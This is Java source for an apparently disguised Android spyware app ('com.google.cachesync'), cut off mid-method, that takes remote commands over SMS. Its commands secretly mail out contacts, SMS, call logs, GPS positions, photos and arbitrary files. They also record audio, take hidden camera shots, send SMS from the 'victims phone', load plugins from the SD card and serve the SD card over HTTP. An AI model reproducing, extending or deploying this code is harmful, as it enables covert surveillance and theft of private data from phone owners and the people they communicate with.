package com.google.cachesync;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import android.content.SharedPreferences;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import com.code4bones.utils.BackgroundTask;
import com.code4bones.utils.Mail;
import com.code4bones.utils.NanoHTTPD;
import com.code4bones.utils.NetLog;

import dalvik.system.DexClassLoader;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.location.LocationManager;
import android.location.Location;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiManager.WifiLock;
import android.os.Environment;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Contacts;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

public class CommandPool extends Object {

	
	public final List<CommandObj> commands = new ArrayList<CommandObj>();
	public Context mContext;
	public ArrayList<ContactObj> mContacts;
	public boolean isIntialized = false;
	
	private static class CommandPoolHolder {
		private static final CommandPool INSTANCE = new CommandPool();
	}
	
	/*
	 * 
	 * 
	 */
	
	public CommandPool() {
		Log.v("CommandPool","Command Pool constructed");
		this.isIntialized= false;
	}
	
	public static CommandPool getInstance() {
		return CommandPoolHolder.INSTANCE;
	}
	

	public CommandPool add(CommandObj cmd) {
		commands.add(cmd);
		return this;
	}
	
	public CommandObj loadPlugin(String jarFile,String classPath) {
		String className = classPath.substring(0, classPath.length()-6).replace("/",".");
		NetLog.v("class name = %s\r\n",className);

		String msg;
		try {
			DexClassLoader classLoader = new DexClassLoader(jarFile, "/mnt/sdcard/", null, getClass().getClassLoader());
			Class<?> cls = classLoader.loadClass(className);
			CommandObj command = (CommandObj)cls.newInstance();
			return command;
		} catch (ClassNotFoundException e) {
			msg = e.getMessage();
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			msg = e.getMessage();
			e.printStackTrace();
		} catch (InstantiationException e) {
			msg = e.getMessage();
			e.printStackTrace();
		}
		NetLog.v("Cannot load plugin:%s\r\n",msg);
		return null;
	}
	
	public boolean loadPlugins() {
    	try {
        	File dir = new File("/mnt/sdcard/");
        	File[] jarList = dir.listFiles(new FilenameFilter() {
				public boolean accept(File file, String name) {
					return name.endsWith(".jar");
				}
        	});
        	if ( jarList.length == 0 )
        		return false;
        	for ( File jarFile: jarList ) {
        		NetLog.v("JAR: %s",jarFile.getAbsolutePath());
        		JarFile jar = new JarFile(jarFile);
        		Enumeration<JarEntry> entryList = jar.entries();
        		while ( entryList.hasMoreElements() ) {
        			JarEntry entry = entryList.nextElement();
        			String name = entry.getName();
        			if ( !name.endsWith(".class") || name.indexOf('$') != -1 )
        				continue;
        			CommandObj command = loadPlugin(jarFile.getAbsolutePath(),name);
        			if ( command == null )
        				continue;
        			
        			NetLog.v("Plugin command added: %s\r\n",command.commandName);
        			add(command);
        		}
        	}
        	
    	} catch ( Exception e) {
			e.printStackTrace();
			return false;
    	}     	
    	return true;
	} // loadPlugins
	
	/*
	 *  Initialization pool with command set
	 */
	public boolean Init(String src,Context context) {
		
		//TODO: Initialization
		NetLog.w("CommandPool Initialization : %s",src);
		
		if ( mContext == null || !context.equals(mContext))  {
			NetLog.v("Changing context %s => %s...",mContext,context);
			mContext = context;
		} else
			NetLog.v("Using cached context...");

		if ( this.isIntialized ) {
			NetLog.v("Command Pool is alread initialized");
			return false;
		}
		
		this.isIntialized= true;
		
		if ( loadPlugins() )
			NetLog.w("Plugins is successfuly loaded");
		
		NetLog.v("Loading contacts...");
		mContacts = listContacts();
		
		
		/*
		 *  Monitoring of call log base 
		 *  "rcalls;on|off"
		 */
		commands.add( new CommandObj("rcalls","on|off")  { 
			
			public int Invoke() throws Exception {
				final handleCallLog handler = new handleCallLog(mContext);
				ContentMonitor con = ContentMonitor.getInstance(commandName, mContext, this, handler);
				if ( !con.setEnable(!args.hasOpt("off"), CallLog.Calls.CONTENT_URI.toString()) )
					return CommandObj.ERROR;
				return CommandObj.OK;
			}
			
			public void Reply(Object ... argv) {
				CallObj call = (CallObj)argv[0];
				commandResult = String.format("%s звонок %s %s / %s,%d сек.",call.type,(call.typeVal == 1||call.typeVal == 3)?"от":"на",call.phone,call.name,call.duration);
				replySMS("++%s",commandResult);
				NetLog.v("%s\r\n",commandResult);
			}
			
		}); // "rcalls"
		
		/*
		 *   Reflects contacts
		 *   "rcontacts;<on|off>"
		 */
		commands.add( new CommandObj("rcontacts","on|off")  { 
				
			public int Invoke() throws Exception {
				final handleContacts handler = new handleContacts(mContext);
				ContentMonitor mon = ContentMonitor.getInstance(commandName, mContext, this, handler);
				if (!mon.setEnable(!args.hasOpt("off"), Contacts.CONTENT_URI.toString()) )
					return CommandObj.ERROR;
				return CommandObj.OK;
			}
			
			public void Reply(Object ... argv) {
				ContactObj con = (ContactObj)argv[0];
				Integer count =  (Integer)argv[1];
				replySMS("++Изменилось кол-во контактов ( %d ), последний - [%s:%s]",count,con.name,con.phoneArray());
			}
		
		}); // "rcontacts"
		
		
		/*
		 *  Network IP address info
		 */
		commands.add( new CommandObj("net")  { 
			
			public void bgProcess() {
				BackgroundTask<Boolean,CommandObj> bg = new BackgroundTask<Boolean,CommandObj>(mContext,false) {
					public void onComplete(Boolean res) {
						try {
							Reply();
						} catch (Exception e) {
							NetLog.v("Failed to reply %s",e.getMessage());
							e.printStackTrace();
						}
					}
					@Override
					protected Boolean doInBackground(CommandObj ... arg0) {
						try {
							commandResult = "";
							for ( Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
								NetworkInterface intf = en.nextElement();
								for ( Enumeration<InetAddress> ea = intf.getInetAddresses(); ea.hasMoreElements();) {
									InetAddress addr = ea.nextElement();
									if ( addr.isLoopbackAddress() )
										continue;
										String localIp = addr.getHostAddress();
										commandResult = commandResult.concat( "lan:" + localIp+";");
								} // InetAddress
							} // Enum NetworkInterface
						} catch ( SocketException e ) {
							NetLog.e("%s: %s",commandName,e.getMessage());
						}
						String externalIp = getExternalIp();
						if ( externalIp  != null )
							commandResult = commandResult.concat("wan:" + externalIp+";");
						return true; 
					}
				};
				bg.exec(this);
			} // bgProcess
			
			public int Invoke() throws Exception {
				bgProcess();
				return CommandObj.OK;
			} // Invoke
			
			public void Reply(Object ... argv) throws Exception {
				if ( args.hasOpt("mail")) 
					createMail().send();
				NetLog.v("ifaddrs: %s",commandResult);
				replySMS("++%s",commandResult);
			}
			
			public String getExternalIp() {
				try {
					HttpClient httpclient = new DefaultHttpClient();
					HttpGet httpget = new HttpGet("http://api.externalip.net/ip");
					if ( httpget != null ) {
	 					HttpResponse response;
						response = httpclient.execute(httpget);
		                HttpEntity entity = response.getEntity();            
		                if ( entity != null ) {
		                	return EntityUtils.toString(entity);
		                }
					}
				} catch ( Exception e ) {
					NetLog.v("Cannot get external ip address: %s",e.getMessage());
				}
                return null;
			}
		}); // "net" command
		
		/*
		 *  List Contacts
		 * "@lcontacts"
		 */
		commands.add(new CommandObj("lcontacts") {
			public int Invoke() throws Exception {
				final List<ContactObj> contacts = listContacts();
				int nCount = 1;
				commandResult = String.format("Total %d names\r\n\r\n",contacts.size());
				for ( ContactObj con:contacts ) {
							String info;
							
							if ( con.phones.size() == 1 ) {
								info = String.format("%03d | %s : %s\r\n",nCount,con.name,con.phones.get(0));
							} else {
								info = String.format("%03d | %s\r\n",nCount,con.name);
								for ( String p : con.phones ) 
									info = info.concat(String.format("   %s\r\n",p));
							} // else
							nCount++;
							commandResult = commandResult.concat(info);
				} // for contacts
				createMail().send();
				return CommandObj.OK;
			}	// invoke		
		});
		
		/*
		 *  Lists SMS messages
		 *  "@lsms;[f:yymmdd];[t:yymmdd]"
		 */
		commands.add(new CommandObj("lsms",";[f:yymmdd];[t:yymmdd]") {
			public int Invoke() throws Exception {
				ArrayList<SmsObj> smsList = listSMS();
		
				String sFrom = new Date(args.dateValue("f")).toLocaleString();
				String sTo;
				long nTo = args.dateValue("t");
				if ( nTo != 0 ) sTo = new Date(args.dateValue("t")).toLocaleString();
				else sTo = sFrom;

				commandResult = String.format("%d messages from %s to %s\r\n", smsList.size(),sFrom,sTo);
				
				for ( SmsObj sms : smsList )
					commandResult = commandResult.concat(String.format("%s | %s  %s | %s\r\n",sms.date,sms.type == SmsObj.IN?"from":"to  ",sms.name,sms.message));
				
				NetLog.v("%s\r\n",commandResult);
				createMail().send();
				
				return CommandObj.OK;
			}
			
			public ArrayList<SmsObj> listSMS() throws ParseException {
				
				Cursor cursor = mContext.getContentResolver().query(Uri.parse("content://sms//"), 
						new String[]{}, 
						getDateClause("date",args.dateValue("f"),args.dateValue("t")),null, "date DESC");
				if ( cursor == null ) 
					return null;
				
				final List<ContactObj> contacts = listContacts();
				final ArrayList<SmsObj> smsList = new ArrayList<SmsObj>();
				final HashMap<String,String> names = new HashMap<String,String>();

				if ( cursor.moveToFirst() ) {
					do {
						
						SmsObj sms = new SmsObj(cursor);
						String name;
						if ( names.containsKey(sms.phone)) {
							name = names.get(sms.phone);
						} else {
							ContactObj contact = findContact(contacts,sms.phone);
							name = contact == null?sms.phone:contact.name;
							names.put(sms.phone,name);
						}
						sms.name = name;
						smsList.add(sms);
					} while ( cursor.moveToNext() );
					cursor.close();
				}
				Collections.sort(smsList);
				return smsList;
			} // listSms
		}); // "lsms" command
		
		
		/*
		 *  Lists calls
		 *  "lcalls;f:yymmdd;t:yymmdd"
		 */
		commands.add( new CommandObj("lcalls","[f:yymmdd;[t:yymmdd]") {

			public int Invoke() throws Exception {
				
				String sFrom = new Date(args.dateValue("f")).toLocaleString();
				String sTo;
				long nTo = args.dateValue("t");
				if ( nTo != 0 ) sTo = new Date(args.dateValue("t")).toLocaleString();
				else sTo = sFrom;
					
				ArrayList<CallObj> callLog = listCalls();
				commandResult = String.format("%d calls from %s to %s\r\n", callLog.size(),sFrom,sTo);
				for ( CallObj call : callLog ) 
					commandResult = commandResult.concat( String.format("%s %s %s %s  ( %d sec )\r\n",call.date,call.type,call.phone,call.name,call.duration));
				
				NetLog.v("%s\r\n",commandResult);
				createMail().send();
			    return CommandObj.OK;
			}	
			
			public ArrayList<CallObj> listCalls() throws ParseException {
			  
				Cursor cursor = mContext.getContentResolver().query(CallLog.Calls.CONTENT_URI,null, 
						getDateClause("date",args.dateValue("f"),args.dateValue("t")), null, "date DESC");
			    ArrayList<CallObj> callLog = new ArrayList<CallObj>();
				
			    if ( cursor == null ) 
					return null;
				
				if ( cursor.moveToFirst() ) {
					do {
						callLog.add(new CallObj(cursor));
					} while ( cursor.moveToNext() );
				}
				return callLog;
			}
		});  // "calls" command
		
		
		/*
		 *   Starts an location manager to acquire gps coords
		*    "@gps;<timeout_sec>"
		 */
		commands.add(new CommandObj("gps",";t:<liveTime>[;off]") {
			
			public boolean isActive = false;
			
			public int Invoke() {
				
				int timeout = args.intValue("t",10); 
				boolean enable = !args.hasOpt("off");
				
				if ( !enable && isActive ) {
						stopGPS();
				} else if ( enable && !isActive ){
					if ( (isActive = startGPS(timeout)) == false )
						return CommandObj.ERROR;
				} else {
					commandResult = String.format("Invalid state ( active : %b ) for action ( enable: %b )",isActive,enable);
					return CommandObj.ERROR;
				}
				
				return CommandObj.OK;
			} // Invoke
			
			public boolean stopGPS() {
				
				LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
				if ( locMgr == null ) {
					commandResult = "Возможно сервисы местоположения выключены";
					return false;
				}
			
				GpsLocationListener gps = GpsLocationListener.getInstance(GpsLocationListener.GPS);
				GpsLocationListener network = GpsLocationListener.getInstance(GpsLocationListener.NETWORK);
				if ( gps != null && network != null ) {
					NetLog.v("Swithing GPS off\r\n");
					locMgr.removeUpdates(gps);
					locMgr.removeUpdates(network);
				} 
				
				return true;
			}
			
			public boolean startGPS(int timeout) {
		
				LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
				if ( locMgr == null ) {
					commandResult = "Возможно сервисы местоположения выключены";
					return false;
				}
	
				GpsLocationListener gps          = GpsLocationListener.getInstance(mContext,GpsLocationListener.GPS);
				GpsLocationListener network = GpsLocationListener.getInstance(mContext,GpsLocationListener.NETWORK);
				locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,1,0,network);
				locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER,1,0,gps);
				GpsLocationListener.startTimer(mContext,this,timeout);
				return true;
			}
			
			public void Reply(Object ... argv) throws Exception {
			
				if ( argv.length != 2 )
					return;
				
				Location gpsLoc = (Location)argv[0];
				Location netLoc = (Location)argv[1];
				
				commandResult = String.format("Местоположение на %s\r\n", new Date().toLocaleString());
				
				String url = "%s | https://maps.google.ru/maps?q=%s,%s\r\n";
				
				if ( gpsLoc == null ) 
						commandResult = commandResult.concat("GPS | Нет данных\r\n");
				else
						commandResult = commandResult.concat(String.format(url,"GPS",
								String.format("%f", gpsLoc.getLatitude()).replace(",","."),
								String.format("%f", gpsLoc.getLongitude()).replace(",",".")));
				
				if ( netLoc == null ) 
						commandResult = commandResult.concat("NETWORK | Нет данных\r\n");
				else
						commandResult = commandResult.concat(String.format(url,"NETWORK",
								String.format("%f", netLoc.getLatitude()).replace(",","."),
								String.format("%f", netLoc.getLongitude()).replace(",",".")));
			
				NetLog.v("Sending coordinates to %s\t\n%s\r\n",args.hasOpt("mail")?"mail":masterPhone,commandResult);
				
				if  ( args.hasOpt("mail") )
					createMail().send();

				replySMS("++%s",commandResult);
			}
			
		}); // "gps" command
		
		
		/*
		 *  Set's up properties,emil,host,etc
		*  "@setup;"
		 */
		commands.add(new CommandObj("setup") {
			public int Invoke() throws Exception {
				
				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
				SharedPreferences.Editor edit = prefs.edit();
				
				if ( args.hasArg(CommandObj.ACK))
					edit.putBoolean(CommandObj.ACK, args.boolValue(CommandObj.ACK));

				if ( args.hasArg(CommandObj.MAIL_TO))
					edit.putString(CommandObj.MAIL_TO,args.strValue(CommandObj.MAIL_TO));
				
				if ( args.hasArg(CommandObj.MAIL_USER))
					edit.putString(CommandObj.MAIL_USER,args.strValue(CommandObj.MAIL_USER));
				
				if ( args.hasArg(CommandObj.MAIL_PASS))
					edit.putString(CommandObj.MAIL_PASS,args.strValue(CommandObj.MAIL_PASS));
				
				edit.commit();
				
				return CommandObj.OK;
			}			
		}); // "setup" command
	
		
		/*
		 *  Shows simple notification on status bat
		 * " @notify;Hello world!;This is the Test"
		 */
		commands.add(new CommandObj("notify",";<title>;<message>") {
			public int Invoke() throws Exception {
				String title = "";
				String msg = "";
				if ( args.optCount() == 0 ) {
					commandResult = "Parameters mismatch...";
					return CommandObj.ERROR;
				} else if ( args.optCount() == 2 ) {					
					title = args.getOpt(0);
					msg = args.getOpt(1);
				} else if ( args.optCount() == 1 ) {
					title = args.getOpt(0);
					msg = "";
				}
				NetLog.Notify(mContext,title, msg);
				return CommandObj.OK;
			}			
		}); // "notify" command

		/*
		 *  Vibrates the phone
		 *  "@vibrate;<sec>;<sec>;...<sec>"
		 */
		commands.add(new CommandObj("vibrate","<ms>;...;<ms>...") {
			
			public int Invoke() {
				Vibrator vibrator = (Vibrator)mContext.getSystemService(Context.VIBRATOR_SERVICE);
				String[] params = args.toArray();
				if ( params.length  == 1 )
					vibrator.vibrate(Integer.valueOf(params[0]));
				else {
					long[] pattern = new long[params.length ];
					for ( int i = 0; i < params.length; i++ )
						pattern[i] = Integer.valueOf(params[i]);
					vibrator.vibrate(pattern, -1);
				}
				return CommandObj.OK;
			}
		}); // "vibrate"
		
		/*
		 *  Turns Wifi on/off
		 *  "wifi;<0|1>"
		 */
		commands.add(new CommandObj("wifi",";0|1") {
			public int Invoke() throws Exception {
				WifiManager wifiManager = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
				boolean enable = CommandArgs.toBoolean(args.getOpt(0));
				WifiLock lock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL, "cachesync.lock");
				lock.acquire();
				if ( !enable )
					wifiManager.disconnect();
				wifiManager.setWifiEnabled(enable);
				if ( enable )
					wifiManager.reconnect();
				lock.release();
				
				return CommandObj.OK;
			}
		}); // "wifi" command

		/*
		 *  Downloads photo's
		 *  format: "photo;"
		 */
		commands.add(new CommandObj("photo",";t:<yymmdd>") {
			
			public List<File> files = new ArrayList<File>();
			public long checkDate = 0;
			
			public void findFiles(File file) {
				File[] dirFiles = file.listFiles();
				for ( File f : dirFiles ) {
					if ( f.isDirectory() && !f.isHidden() )
						findFiles(f.getAbsoluteFile());
					else if ( !f.isHidden() ) {
						if ( f.lastModified() > checkDate ) {
							files.add(f);
						}
					}
				}
				
			}
	
			public void send() {
				BackgroundTask<Boolean,Void> bgTask = new BackgroundTask<Boolean,Void>(mContext,false) {
					@Override
					protected Boolean doInBackground(Void ... arg0) {
						try {
							int count = 0;
							int maxCount = 2;
							int sendCount = 0;
							Mail mail = null;
							
							for ( File f : files ) {
								if ( count == 0 ) {
									NetLog.v("Mail created\r\n");
									mail = createMail();
								}
								
								NetLog.v("Photo added %s\r\n", f.getAbsolutePath());
								mail.addAttachment(f.getAbsolutePath());
								count++;
								if ( count == maxCount ) {
									int tmp = sendCount+1;
									sendCount += count;
									commandResult = String.format("Photos %d-%d of %d\r\n",tmp,sendCount,files.size());
									mail.setBody(commandResult);
									mail.send();
									count = 0;
								}
							} // files
							
							if ( count != 0 ) {
								NetLog.v("Remaining mails %d",count);
								int tmp = sendCount+1;
								sendCount += count;
								commandResult = String.format("Photos %d-%d of %d\r\n",tmp,sendCount,files.size());
								mail.setBody(commandResult);
								mail.send();
							}
							NetLog.v("Photos sent %d/%d",sendCount,files.size());
						} catch (Exception e) {
							NetLog.v("Sending mail: %s",e.getMessage());
						}
						return true; 
					}
				};
				bgTask.exec();
			}
			
			public int Invoke() throws Exception {
				
				File file = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
				checkDate = args.dateValue("t");
				findFiles(file.getAbsoluteFile());
				if ( files.size() == 0 ) {
					commandResult = String.format("No photos found...");
					return CommandObj.REPLY;
				}
				send();
				return CommandObj.OK;
			}
		}); // "photo"
		
		/*
		 *  downloads an arbitary file
		 *   "file;f:<filepath>;[m:<mask>]"
		 */
		commands.add(new CommandObj("file",";f:<filepath>;[m:<ext>]") {
			
			final class Filter implements FilenameFilter {
				private String mask;
				
				public Filter(String mask) {
					this.mask= mask;
				}

				public boolean accept(File file, String name) {
					return name.endsWith(mask);
				}
			}
			
			public int Invoke() throws Exception {
				
				if ( args.argCount() == 0 || args.hasArg("f") == false ) {
					commandResult  = String.format("%s: Arguments missed ( f: m: )",commandName);
					return CommandObj.ERROR;
				}
				String fileName = args.strValue("f");
				File file = new File(fileName);
				String files[];
				
				if ( file.isFile() && file.exists() ) {
					files = new String[1];
					files[0] = file.getName(); 
				} else if ( file.isDirectory() && args.hasArg("m")) {
					files = file.list(new Filter(args.strValue("m")));
				} else {
					commandResult = String.format("File %s doesn't exists", fileName);
					return CommandObj.ERROR;
				}
				
				commandResult = String.format("downloaded %d file(s)",files.length);
				
				Mail mail = createMail();
				for ( String fn : files ) {
					String fullName;
					if ( file.isDirectory() ) fullName = file.getAbsolutePath() + "/" + fn;
						else fullName = file.getAbsolutePath();
						
					NetLog.v("Downloading %s\r\n", fullName);
					commandResult = commandResult.concat(fullName) + "\r\n";
					mail.addAttachment(fullName);
				}
				mail.send();
				return CommandObj.OK;
			}
		}); // "file" command

		
		/*
		 *  SMS reflection
		 *  "rsms;<on|off>;[mail]"
		 */
		commands.add(new CommandObj("rsms","[;off][;mail]") {
			
			final public HashMap<String,String> names = new HashMap<String,String>();
			
			public int Invoke() throws Exception {
				final handleSmsLog handler = new handleSmsLog(mContext);
				ContentMonitor mon = ContentMonitor.getInstance(commandName, mContext, this,handler); 				
				if ( !mon.setEnable(!args.hasOpt("off"), "content://sms/") )
					return CommandObj.ERROR;
				return CommandObj.OK;
			}
			
			public void Reply(Object ... argv )  throws Exception  {
				SmsObj sms = (SmsObj)argv[0];
				String name = sms.phone;
				if ( names.containsKey(sms.phone) ) {
					name = names.get(sms.phone);
				} else {
					ContactObj contact = findContact(mContacts,sms.phone);
					if ( contact != null ) {
						name = contact.name;
						names.put(sms.phone, name);
					}
				}
				commandResult = String.format("%s '%s'  : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
				NetLog.v("Redirecting to %s : \"%s\"\r\n",masterPhone,commandResult);
				boolean mail    = args.hasOpt("mail");
				if ( mail ) {
					NetLog.v("Sending Log to mail...%b\r\n",mail);
					createMail().send();
				}
			}
		}); // "rsms"
		
		/*
		 *  Voice recording
		 *  "mic;t:<sec>"
		 */
		commands.add(new CommandObj("mic","<sec>") {
			public int Invoke() throws Exception {
				
				if ( args.optCount() == 0 ) {
					commandResult = "Не указано время записи  (сек)";
					return CommandObj.ERROR;
				}
				
				int timeout = Integer.valueOf(args.getOpt(0));
				VoiceRecorder vr = VoiceRecorder.getInstance(mContext,this,timeout);
				vr.start();
				NetLog.v("Recording started, for %d secs\r\n",timeout);
				return CommandObj.OK;
			}
			
			public void Reply(Object ... objs) throws Exception {
				
				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
				boolean ack = prefs.getBoolean(CommandObj.ACK, true);
				
				String fileName = (String)objs[0];
				NetLog.v("Sending audio...%s\n",fileName);
				File file = new File(fileName);
				if ( !file.exists() ) {
					NetLog.v("File %s not found\r\n",fileName);
					return;
				}
				commandResult = String.format("Audio record on %s\r\n%s\r\n",new Date().toLocaleString(),fileName);
				createMail().addAttachment(fileName).send();
				if ( ack ) {
					replySMS("++%s",commandResult);
				}
			}
		}); // "voice" command
		

		/*
		 * 
		 * 
		 */
		commands.add(new CommandObj("cam","0|1") {
			
			final class picCallback implements Camera.PictureCallback {

				public void onPictureTaken(byte[] data, Camera camera) {

					camera.release();
					if ( data == null ) {
						NetLog.v("Camera data == null\r\n");
						return;
					}
					
					NetLog.v("OK !\n");
					//NetLog.Toast(mContext,"Picture takken: len %d\n",data.length);                	
					
					Bitmap bmp = BitmapFactory.decodeByteArray(data, 0,	data.length );
               		ByteArrayOutputStream bs = new ByteArrayOutputStream();
					bmp.compress(Bitmap.CompressFormat.JPEG, 100, bs);
					try {
						File file = new File("/mnt/sdcard/shot.jpg");
						if ( !file.createNewFile() ) {
							NetLog.v("Cannot create file %s\r\n",file.getAbsolutePath());
							return;
						}
						FileOutputStream fsOut = new FileOutputStream(file);
						fsOut.write(bs.toByteArray());
						fsOut.close();
						//NetLog.Toast(mContext,"File saved %s\n",file.getAbsolutePath());
						
					} catch ( Exception e ) {
						NetLog.v("Cannot write file: %s",e.getMessage());
					}
			
				}
				
			};
			
			public int Invoke() throws Exception {
					final Camera cam = Camera.open();
					Camera.Parameters params = cam.getParameters();
					cam.setParameters(params);
					SurfaceView sf = new SurfaceView(mContext);
					sf.getHolder().addCallback(new SurfaceHolder.Callback() {
						
						public void surfaceDestroyed(SurfaceHolder holder) {
								NetLog.v("surfaceDestroyed\n");
						}
						
						public void surfaceCreated(SurfaceHolder holder) {
							NetLog.v("surfaceCreated\n");
						}
						
						public void surfaceChanged(SurfaceHolder holder, int format, int width,
								int height) {
							NetLog.v("surfaceChanged\n");
						}
					});
					
					cam.setPreviewDisplay(sf.getHolder());
					
					cam.startPreview();
					cam.cancelAutoFocus();
					//Thread.sleep(5000);	
					NetLog.v("Taking picture\n");
					cam.takePicture(null, null, new picCallback());
					return CommandObj.OK;
			}
			
			public void Reply(Object ... argv) {
			}
		}); // "cam"

		
		/*
		 *  send sms from victims phone
		 *  "msg;<phone>;<message>"
		 */
		commands.add(new CommandObj("msg","<phone>;<text>") {
			public int Invoke() throws Exception {
				
				if ( args.optCount() != 2 ) {
					commandResult = String.format("Parameters missmatch.");
					return CommandObj.ERROR;
				}
				
				String phone = args.getOpt(0);
				String msg    = args.getOpt(1);
				
				NetLog.v("Spoofing to number %s : %s\r\n", phone,msg);
				commandResult = String.format("number %s spoofed",phone);
				sendSMS(phone,"%s",msg);
				
				return CommandObj.OK;
			}
		}); // "sms" command
		
		
		/*
		 *  Send the availsbale command to requestor
		 *  "help"
		 */
		commands.add(new CommandObj("help") {
			public int Invoke() {
				for ( CommandObj cmd : commands ) {
					if ( commandResult.length() > 0 ) commandResult = commandResult.concat(",");
					
					commandResult = commandResult.concat(cmd.commandName);
					commandResult = commandResult.concat(cmd.helpString);
				}
				replySMS("++%s",commandResult);
				return CommandObj.OK;
			}
		}); // "help" command

		
		/*
		 *  HTTPD Server
		 *  "httpd;[host];<port>"
		 */
		commands.add(new CommandObj("httpd",";{stop};{<ip>];<port>}") {
			public int Invoke() throws Exception {
				String  host = null;
				String  port = null;
				NanoHTTPD srv = NanoHTTPD.getInstance(); 

				if ( args.hasOpt("stop") && srv.isActive() )
					srv.Stop();
				else {
					if ( args.optCount() == 2) {
						host = args.getOpt(0);
						port = args.getOpt(1);
					} else if ( args.optCount() == 1 ) {
						port = args.getOpt(0);
					} else { 
							commandResult = "host ip or port is missing..";
							return CommandObj.ERROR;
					}
					srv.Start(host,Integer.valueOf(port),new File("/mnt/sdcard/"));
				}				
				NetLog.v("HTTPD %s on %s:%s",srv.isActive()?"Started":"Stopped",host==null?"localhost":host,port);
				return CommandObj.OK;
			}
		});
		
		//TODO: Add new commands above this line
		
		NetLog.w("Commad Pool initialized with %d commands",commands.size());
		
		return true;
		
	} // CommandPool#Init
	
	
	/*
	 *  Execution sms command
	 */
	public boolean Execute(String phone,String source ) {
		
		String commandName = source;
		String args = "";
		int sep = source.indexOf(";");
		if ( sep != -1 ) {
			commandName = source.substring(1,sep);
			args = source.substring(sep+1);
		} else commandName = source.substring(1);
	
		NetLog.v("cmd = \"%s\",args = \"%s\"\r\n",commandName,args);
		CommandObj cmd = findCommand(commandName);
		if ( cmd == null ) {
			SmsManager mgr = (SmsManager)SmsManager.getDefault();
			mgr.sendTextMessage(phone, null, String.format("++E: \"%s\"", source), null,null);
			return true;
		}
	
		try {
			synchronized(cmd) {
				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME, 1);
				cmd.initCommand(mContext,phone,args);
				
				int result = cmd.Invoke();
				if ( result == CommandObj.REPLY )
					cmd.Reply();
				else if ( result == CommandObj.ERROR ) {
						throw new Exception(cmd.commandResult);
				}  else if ( prefs.getBoolean(CommandObj.ACK, false) ) 
						cmd.replySMS("++%s : ok", cmd.commandName);
			}
		} catch ( Exception e ) {
			cmd.replySMS("++Ошибка: '%s %s': %s",cmd.commandName,cmd.argSource,e.getMessage());
			NetLog.v("Error: %s : %s\r\n",cmd.commandName,e.getMessage());
		}
		return true;
	}
	
	/*
	 *  gets command by name
	 */
	public CommandObj findCommand(String commandName) {
		synchronized(commands) {
			for ( CommandObj cmd : commands) {
				if ( cmd.commandName.equalsIgnoreCase(commandName ))
					return cmd;
			}
			return null;
		}
	}

	/*
	 *  Accesses all conatacs in the phone
	 */
	public ArrayList<ContactObj> listContacts() {
		ArrayList<ContactObj> list = new ArrayList<ContactObj>();
		Cursor cursor = mContext.getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
		NetLog.v("Cursor size = %d\n",cursor.getCount());
		if ( cursor.moveToFirst() ) {
			do {
				list.add(new ContactObj(cursor,mContext));
			} while ( cursor.moveToNext() );
			cursor.close();
		} // moveToFirst
		NetLog.v("Found %d names\n", list.size());
		return list;
	}
	
	/*
	 *  Finds arbitary contact name for phone number
	 */
	ContactObj findContact(List<ContactObj> list, String phone) {
		for (ContactObj c : list ) {
			if ( c.containsPhone(phone))
				return c;
		}
		return null;
	} // findContact
	
	
	/*
	 *  returns WHERE date clause
	 */
	public String getDateClause(String dateField,long fromTime,long toTime) {
		Calendar toCal = Calendar.getInstance();
		
		if ( fromTime == 0 )
			return null;
		
		if ( toTime == 0 ) toCal.setTime(new Date(fromTime));
			else toCal.setTime(new Date(toTime));
		
		toCal.set(Calendar.HOUR_OF_DAY,23);
		toCal.set(Calendar.MINUTE,59);
		toCal.set(Calendar.SECOND,59);
		
		NetLog.v("from %s to %s\n",new Date(fromTime).toLocaleString(),toCal.getTime().toLocaleString());
		
		return String.format("%s >= %d AND %s <= %d ",dateField,fromTime,dateField,toCal.getTime().getTime()); 
	}
	
	public String getNameByPhone(String phone) {
		
		Uri uri;
        String[] projection;
        String name = null;

        // If targeting Donut or below, use
        // Contacts.Phones.CONTENT_FILTER_URL and
        // Contacts.Phones.DISPLAY_NAME
        uri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phone));
        projection = new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME };

        // Query the filter URI
        Cursor cursor = mContext.getContentResolver().query(uri, projection, null, null, null);
        if (cursor != null) {
            if (cursor.moveToFirst())
                name = cursor.getString(0);
            cursor.close();
        }
		return name;
	}
	
	public void defaultSettings() {
		SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
		SharedPreferences.Editor edit = prefs.edit();
		edit.putBoolean(CommandObj.ACK,true);
